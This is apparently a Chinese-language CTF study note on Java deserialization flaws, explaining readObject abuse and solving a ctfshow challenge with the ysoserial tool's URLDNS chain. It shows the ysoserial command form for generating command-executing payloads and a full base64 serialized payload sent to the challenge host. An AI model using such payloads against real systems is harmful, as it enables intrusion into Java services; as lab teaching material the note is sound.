# JAVA反序列化

<br>

### 序列化调用的函数

序列化：java.io.ObjectOutputStream 类中的 writeObject()
实现 Serializable 和 Externalizable 接口的类才能被序列化

<br>

### 反序列化调用的函数

反序列化：java.io.ObjectInputStream 类中的 readObject()

<br>

在 Java中，重写的方法会优先执行。如果重写了readObject()，并且函数中某个参数的输入可控，那么攻击者就可以输入任意命令(代码)。在反序列化过程中调用readObject()方法时，就会执行恶意命令，造成攻击

<br>

### 课程

- [java反序列化1](https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805&ctype=0)


- [java反序列化2](https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&vd_source=23c2bbe4623ae526416ea7a1ec4679fc)

<br>

## 例题

<br>

#### URLDNS链

URLDNS链不能执行命令，通常作为验证是否存在反序列化漏洞的一种方式。

脚本 ysoserial.jar

用法

````
java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'
````

URLDNS例题        来自ctfshow846

ctfshow会对你post提交的ctfshow参数进行base64解码
然后进行反序列化
构造出对当前题目地址的dns查询即可获得flag 

<img src="https://54huarui.github.io/blogs/javax/x0.png" width="880" height="480">

````
┌──(root💀kali)-[/home/huarui/桌面/java tool]
└─# java -jar ysoserial.jar URLDNS "http://bb7c5da6-cbdd-4585-8c3e-9793141c140f.challenge.ctf.show/"|base64
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVz
aG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFz
aENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgAD
TAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAN2JiN2M1
ZGE2LWNiZGQtNDU4NS04YzNlLTk3OTMxNDFjMTQwZi5jaGFsbGVuZ2UuY3RmLnNob3d0AAEvcQB+
AAV0AARodHRwcHh0AD9odHRwOi8vYmI3YzVkYTYtY2JkZC00NTg1LThjM2UtOTc5MzE0MWMxNDBm
LmNoYWxsZW5nZS5jdGYuc2hvdy94
````

然后将playload输入即可

<img src="https://54huarui.github.io/blogs/javax/javax.png" width="880" height="480">

